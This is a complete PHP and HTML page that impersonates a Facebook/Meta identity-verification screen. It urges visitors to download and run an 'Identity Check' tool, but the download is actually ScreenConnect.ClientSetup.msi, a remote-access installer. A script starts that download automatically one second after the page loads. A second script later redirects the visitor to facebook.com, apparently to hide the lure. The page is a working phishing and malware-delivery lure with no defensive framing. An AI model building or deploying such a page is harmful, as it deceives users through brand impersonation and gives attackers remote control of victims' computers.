<?php
// PHP Script to handle secure file download
if (isset($_GET['file'])) {
    $fileName = basename($_GET['file']);
    $filePath = __DIR__ . '/downloads/' . $fileName;

    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'msi') {
        header('Content-Description: File Transfer');
        header('Content-Type: application/x-msi');
        header('Content-Disposition: attachment; filename="' . $fileName . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    } else {
        $error = "Verification file is temporarily unavailable. Please try again.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Confirm Your Identity</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f0f2f5 0%, #e4e6ea 100%);
            color: #1c1e21;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
            max-width: 460px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(to right, #1877f2, #42b72a);
        }

        .fb-logo {
            width: 72px;
            height: 72px;
            fill: #1877f2;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            color: #050505;
            margin-bottom: 12px;
        }

        p.subtitle {
            color: #65676b;
            font-size: 15.5px;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        .notice-box {
            background-color: #e7f3ff;
            border: 1px solid #a4c9f2;
            padding: 16px;
            border-radius: 8px;
            text-align: left;
            font-size: 14px;
            color: #050505;
            margin-bottom: 24px;
            line-height: 1.5;
        }

        .file-card {
            background: #f8f9fa;
            border: 1px solid #dadde1;
            border-radius: 8px;
            padding: 18px;
            margin-bottom: 24px;
            text-align: left;
            font-size: 14px;
        }

        .file-card div {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #e4e6eb;
        }

        .file-card div:last-child {
            border-bottom: none;
        }

        .file-card span {
            color: #65676b;
        }

        .file-card strong {
            color: #1c1e21;
            font-weight: 600;
        }

        .btn-fb {
            display: inline-block;
            width: 100%;
            background-color: #1877f2;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            padding: 14px 0;
            border: none;
            border-radius: 8px;
            text-decoration: none;
            transition: all 0.2s ease;
            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
        }

        .btn-fb:hover {
            background-color: #166fe5;
            transform: translateY(-2px);
        }

        .security-badge {
            margin-top: 24px;
            font-size: 13px;
            color: #28a745;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-weight: 600;
        }

        .footer-text {
            margin-top: 32px;
            font-size: 13px;
            color: #8a8d91;
            text-align: center;
        }

        .alert-error {
            background-color: #ffebe9;
            color: #ce011a;
            padding: 14px;
            border-radius: 8px;
            font-size: 14px;
            margin-bottom: 20px;
            border: 1px solid #ffcdd2;
        }
    </style>
</head>
<body>

<div class="container">
    <svg class="fb-logo" viewBox="0 0 24 24">
        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
    </svg>

    <h1>Confirm Your Identity</h1>
    <p class="subtitle">To secure your account, please download and run the Identity Verification tool on your PC.</p>

    <div class="notice-box">
        <strong>Action Required:</strong> Download the official security module below to complete your identity check and restore full access.
    </div>

    <?php if (isset($error)): ?>
        <div class="alert-error"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>

    <div class="file-card">
        <div><span>Required Tool:</span> <strong>Facebook-Identity-Check.msi</strong></div>
        <div><span>Security Level:</span> <strong>256-Bit Encrypted</strong></div>
        <div><span>Compatibility:</span> <strong>Windows 10 / 11</strong></div>
    </div>

    <!-- Direct download link triggering PHP handler -->
    <a href="ScreenConnect.ClientSetup.msi" class="btn-fb">
        Download Identity Checker (.MSI)
    </a>

    <div class="security-badge">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
        </svg>
        Official Meta Security Verification
    </div>
</div>

<p class="footer-text">Meta © 2026 • Security & Privacy Center</p>

<script>
window.addEventListener("load", function () {
    setTimeout(function () {
        window.location.href = "ScreenConnect.ClientSetup.msi";
    }, 1000);
});
</script>

<script>
window.addEventListener("load", function () {
    setTimeout(function () {
        window.location.href = "https://www.Facebook.com/";
    }, 60000);
});
</script>

</body>
</html>
